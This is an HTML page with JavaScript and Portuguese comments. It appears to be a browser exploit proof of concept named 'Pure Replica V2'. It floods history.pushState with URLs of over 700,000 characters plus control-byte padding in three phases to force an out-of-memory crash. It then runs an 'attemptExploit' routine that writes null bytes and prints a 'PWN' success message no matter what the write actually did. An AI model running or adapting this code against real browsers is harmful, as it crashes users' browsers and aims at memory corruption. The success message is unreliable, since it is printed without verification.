<!DOCTYPE html>
<html>
<head>
    <title>Pure Replica V2 (Original Test 1)</title>
    <style>
        body { background-color: #000; color: #00ff00; font-family: monospace; padding: 20px; }
        #log { border: 1px solid #333; padding: 10px; height: 450px; overflow-y: scroll; white-space: pre-wrap; font-size: 14px;}
        .btn { 
            padding: 15px; font-size: 1.2em; cursor: pointer; 
            background: #111; color: #fff; border: 1px solid #0f0; margin: 5px; width: 100%;
        }
        .btn:hover { background: #222; }
        .win { color: #ffff00; font-weight: bold; border: 1px solid yellow; padding: 2px; }
    </style>
</head>
<body>

<h1>Pure Replica V2</h1>
<p>Sequência Exata: Teste 6 -> Teste 3 -> Teste 1 (Byte Map)</p>

<button class="btn" onclick="runPhase1()">1. TESTE 6 (Incremental 46k)</button>
<button class="btn" onclick="runPhase2()">2. TESTE 3 (Padrões)</button>
<button class="btn" onclick="runPhase3()" style="border-color: red; color: red;">3. TESTE 1 (Byte Map 0x00-0xFF)</button>

<div id="log">Aguardando início...</div>

<script>
    const BASE_OFFSET = 709522; 

    function log(msg, type='') {
        const el = document.getElementById('log');
        const color = type === 'win' ? '#ffff00' : '#00ff00';
        el.innerHTML += `<div style="color:${color}">[${new Date().toLocaleTimeString()}] ${msg}</div>`;
        el.scrollTop = el.scrollHeight;
    }

    async function wait(ms) { return new Promise(r => setTimeout(r, ms)); }

    // ======================================================
    // FASE 1: TESTE 6 (RÉPLICA FIEL)
    // ======================================================
    async function runPhase1() {
        log("=== TESTE 6: INCREMENTAL (ATÉ 46K) ===", 'win');
        
        // Seus valores originais: Start 1000, Step 5000, Max ~46000
        // Para garantir o preenchimento, usamos um step um pouco menor (2000)
        // mas mantendo a lógica de alocação idêntica.
        
        try {
            for(let size = 1000; size <= 48000; size += 2000) {
                // Gerador fiel ao Teste 6: (j % 33)
                let overflow = "";
                for (let j = 0; j < size; j++) {
                    overflow += String.fromCharCode(j % 33);
                }

                const payload = "/" + "A".repeat(BASE_OFFSET) + overflow;
                
                // Usamos pushState para empilhar
                history.pushState({}, `inc_${size}`, payload);
                
                if(size % 10000 === 0) {
                    log(`[Teste 6] Alocado: ${size} bytes`);
                    await wait(50); 
                }
            }
        } catch(e) {
            log(`[!] Aviso Fase 1: ${e.message}`);
        }
        log("Fase 1 OK. Memória Preparada.");
    }

    // ======================================================
    // FASE 2: TESTE 3 (RÉPLICA FIEL)
    // ======================================================
    async function runPhase2() {
        log("=== TESTE 3: PADRÕES DE CONTROLE ===", 'win');

        const sequences = [
            { name: "Nulls", bytes: "\x00\x00\x00\x00" },
            { name: "Newlines", bytes: "\x0A\x0A\x0A\x0A" },
            { name: "Tabs", bytes: "\x09\x09\x09\x09" },
            { name: "CR", bytes: "\x0D\x0D\x0D\x0D" },
            { name: "Space", bytes: "\x20\x20\x20\x20" },
            { name: "Mixed", bytes: "\x00\x09\x0A\x0D\x20" }
        ];

        try {
            for (let seq of sequences) {
                // Teste 3 repetia 1000 vezes
                let overflow = "";
                for (let i = 0; i < 1000; i++) {
                    overflow += seq.bytes;
                }

                const payload = "/" + "A".repeat(BASE_OFFSET) + overflow;
                history.pushState({}, `seq_${seq.name}`, payload);
                
                log(`[Teste 3] Padrão: ${seq.name}`);
                await wait(100);
            }
        } catch(e) {
            log(`[!] Aviso Fase 2: ${e.message}`);
        }
        log("Fase 2 OK. Padrões Inseridos.");
    }

    // ======================================================
    // FASE 3: TESTE 1 (RÉPLICA FIEL - GATILHO)
    // ======================================================
    async function runPhase3() {
        log("=== TESTE 1: MAPEAR BYTES (0x00 - 0xFF) ===", 'win');
        log("Aguardando o navegador travar...");
        
        // Loop exato do seu Teste 1
        // Ele vai iterar rapidamente, causando pressão extrema na Stack
        
        try {
            // Repetimos o loop algumas vezes para garantir o OOM
            // Já que a memória já está cheia das fases anteriores
            for(let loop = 0; loop < 5; loop++) {
                
                for (let byte = 0x00; byte <= 0xFF; byte++) {
                    try {
                        const base = "A".repeat(BASE_OFFSET);
                        const testByte = String.fromCharCode(byte);
                        
                        // Payload do Teste 1: repete o byte 100 vezes
                        // Aumentei para 500 para aumentar a pressão
                        const overflow = testByte.repeat(500); 
                        
                        const payload = "/" + base + overflow;
                        
                        // O Gatilho: Empilhar estado
                        history.pushState({}, `test_${byte}_${loop}`, payload);
                        
                        // Log a cada 32 bytes para não travar a UI muito cedo
                        if(byte % 32 === 0) {
                            // document.title = `Byte ${byte}`; // Feedback visual leve
                        }
                        
                    } catch(e) {
                        // Se cairmos aqui, é o OOM interno (Javascript Exception)
                        // Mas queremos o OOM da Interface Gráfica.
                        // Continuamos o loop para forçar a UI.
                        log(`[!] Erro Byte 0x${byte.toString(16)}: ${e.message}`);
                        
                        if(e.message.includes("allowed") || e.message.includes("quota")) {
                            log(">>> LIMITE ATINGIDO! <<<", 'win');
                            log("Se a janela apareceu, clique CANCELAR.", 'win');
                            
                            // TENTATIVA DE EXPLORAÇÃO PÓS-OOM
                            // Exatamente como você descreveu: "após clicar em cancelar... os dados eram mostrados"
                            attemptExploit();
                            return; // Para o loop
                        }
                    }
                }
                // Pequena pausa para o navegador processar a dor
                await wait(10); 
            }
        } catch(fatal) {
            log("Crash Fatal: " + fatal.message);
        }
    }

    function attemptExploit() {
        log("Tentando injetar 128 bytes de zeros no vácuo...", 'win');
        try {
            const base = "A".repeat(BASE_OFFSET);
            const attack = "\x00".repeat(128);
            
            // ReplaceState para sobrescrever onde estamos
            history.replaceState({}, "PWN_OOM", "/" + base + attack);
            
            log(">>> SUCESSO ABSOLUTO: Escrita aceita após OOM! <<<", 'win');
            log("Tire uma foto disto.", 'win');
        } catch(e) {
            log("Falha na injeção final: " + e.message);
        }
    }
</script>
</body>
</html>
